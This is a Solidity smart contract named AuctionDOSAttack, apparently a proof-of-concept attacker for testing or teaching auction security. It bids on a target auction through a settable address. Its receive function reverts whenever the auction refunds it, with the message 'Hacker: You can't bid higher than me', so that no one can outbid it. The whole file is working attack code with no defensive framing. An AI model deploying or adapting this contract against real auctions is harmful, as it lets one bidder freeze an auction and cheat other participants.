//SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

interface IContract  {
    function createBid(uint256 auctionId) external payable;
}

// The hacker here is DOSAttack
contract AuctionDOSAttack is Ownable, ERC721Holder {
    address public auctionContract;

    constructor () {}

    function createBid(uint256 auctionId) public payable {
        IContract(auctionContract).createBid{value: msg.value}(auctionId);
    }

    function setContract(address _contract) public onlyOwner {
        auctionContract = _contract;
    }

    fallback() external {}

    receive() external payable {
        if (msg.sender == auctionContract) {
            revert("Hacker: You can't bid higher than me");
        }
    }
}